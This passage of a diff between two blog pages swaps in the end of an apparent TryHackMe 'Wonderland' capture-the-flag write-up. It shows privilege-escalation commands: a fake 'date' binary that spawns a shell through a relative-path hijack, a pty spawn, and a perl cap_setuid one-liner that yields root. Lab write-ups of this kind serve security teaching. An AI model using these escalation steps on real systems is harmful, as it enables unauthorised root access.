+__do_global_dtors_aux
+completed.7325
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+</code></pre><p>From the above, I found the &ldquo;date&rdquo; binary has been used to run with a relative path. So, now its more like the previous exploitation technique. So, lets create a date executable file.</p>
+<pre><code>rabbit@wonderland:/home/rabbit$ cat date
+#!/bin/bash
+/bin/sh
+</code></pre><p>Now we gave the executable permission for the file. Now we need to add this path to the env.</p>
 <figure>
-    <img src="https://0xSh1v4.github.io/Tryhackme/Anonymous/5.png"
-         alt="Tryhackme: Anonymous machine - Privilege Escalation to Root"/> <figcaption>
-            <p>Tryhackme: Anonymous machine - Privilege Escalation to Root</p>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/8.png"
+         alt="Tryhackme: Wonderland machine - Set ENV variable to elevate priv to Hatter"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Set ENV variable to elevate priv to Hatter</p>
         </figcaption>
 </figure>
 
-<p>And that&rsquo;s how we have got our root flag.</p>
+<p>So, now the binary will look for the date first from the /home/rabbit directory.</p>
+<p>So, lets execute the script.</p>
+<pre><code>rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by $ id
+uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
+$ whoami
+hatter
+</code></pre><p>So, we have escalated our priv to hatter.</p>
+<p>Lets change this shell to full spawn tty.</p>
+<p><code>python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/9.png"
+         alt="Tryhackme: Wonderland machine - Escalation to Rabbit"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Escalation to Rabbit</p>
+        </figcaption>
+</figure>
+
+<p>Now, we have obtained the password from the hatter home directory.</p>
+<p>lets do su hatter with the password to logged in as a 100% priv user.</p>
+<p>Before when I tried Linpeas.sh script, I found the SUID capabilities is being set for this Hatter/root to excute the perl.</p>
+<pre><code>hatter@wonderland:~$ id
+uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
+hatter@wonderland:~$ getcap -r / 2&gt;/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+</code></pre><p>Now, lets elevate the privileges using the following command to get the root.</p>
+<p>Read more: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/">SUID-Capabilities</a></p>
+<pre><code>hatter@wonderland:/tmp$ getcap -r / 2&gt;/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+hatter@wonderland:/tmp$ /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;'
+root@wonderland:/tmp# id
+uid=0(root) gid=1003(hatter) groups=1003(hatter)
+root@wonderland:/tmp# whoami
+root
+</code></pre><p>Now, we got the user.txt from /root folder and the root.txt from the alice folder.</p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Wonderland/10.png"
+         alt="Tryhackme: Wonderland machine - Getting root.txt file"/> <figcaption>
+            <p>Tryhackme: Wonderland machine - Getting root.txt file</p>
+        </figcaption>
+</figure>
+
+<p>And thats how we got the root flag. To be honest, I spend lots of time in the first escalation part from alice to rabbit, it din&rsquo;t strike to me in the beginning. I loved the escalation in this machine from Alice -&gt; Rabbit-&gt; Hatter -&gt; Root. Learned so much out of this box.</p>
 <p>Thanks for reading! Prost! 🍺</p>
 <p>If you have any questions: Feel free to contact me.</p>
 <p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
@@ -539,7 +474,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1536 Words
+        1435 Words
       </p>
 
       <p>
@@ -549,13 +484,13 @@ find / -perm -u=s -type f 2&gt;/dev/null
           <line x1="8" y1="2" x2="8" y2="6"></line>
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
-        2020-09-01 02:00 &#43;0200
+        2020-09-12 02:00 &#43;0200
       </p>
     </div>
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -563,7 +498,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -572,7 +507,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Tryhackme-%20Anonymous%20Writeup&amp;caption=Tryhackme-%20Anonymous%20Writeup&amp;canonicalUrl=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Tryhackme-%20Wonderland%20Writeup&amp;caption=Tryhackme-%20Wonderland%20Writeup&amp;canonicalUrl=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -581,7 +516,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Tryhackme-%20Anonymous%20Writeup&amp;body=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=Tryhackme-%20Wonderland%20Writeup&amp;body=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -589,7 +524,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f&amp;media=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f;description=Tryhackme-%20Anonymous%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f&amp;media=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f;description=Tryhackme-%20Wonderland%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -597,7 +532,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f&amp;title=Tryhackme-%20Anonymous%20Writeup&amp;summary=Tryhackme-%20Anonymous%20Writeup&amp;source=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f&amp;title=Tryhackme-%20Wonderland%20Writeup&amp;summary=Tryhackme-%20Wonderland%20Writeup&amp;source=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -605,7 +540,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f&amp;resubmit=true&amp;title=Tryhackme-%20Anonymous%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f&amp;resubmit=true&amp;title=Tryhackme-%20Wonderland%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -613,7 +548,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f;title=Tryhackme-%20Anonymous%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f;title=Tryhackme-%20Wonderland%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -621,7 +556,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Tryhackme-%20Anonymous%20Writeup%20https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Tryhackme-%20Wonderland%20Writeup%20https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -629,7 +564,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f&amp;t=Tryhackme-%20Anonymous%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f&amp;t=Tryhackme-%20Wonderland%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -637,7 +572,7 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Tryhackme-%20Anonymous%20Writeup&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-anonymous-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Tryhackme-%20Wonderland%20Writeup&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-wonderland-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -655,18 +590,11 @@ find / -perm -u=s -type f 2&gt;/dev/null
 
         <div class="pagination__buttons">
           
-            <span class="button previous">
-              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/">
-                <span class="button__icon">←</span>
-                <span class="button__text">Tryhackme- Wonderland Writeup</span>
-              </a>
-            </span>
-          
 
           
             <span class="button next">
-              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/">
-                <span class="button__text">Tryhackme- Gaming Server Writeup</span>
+              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-anonymous-writeup/">
+                <span class="button__text">Tryhackme- Anonymous Writeup</span>
                 <span class="button__icon">→</span>
               </a>
             </span>
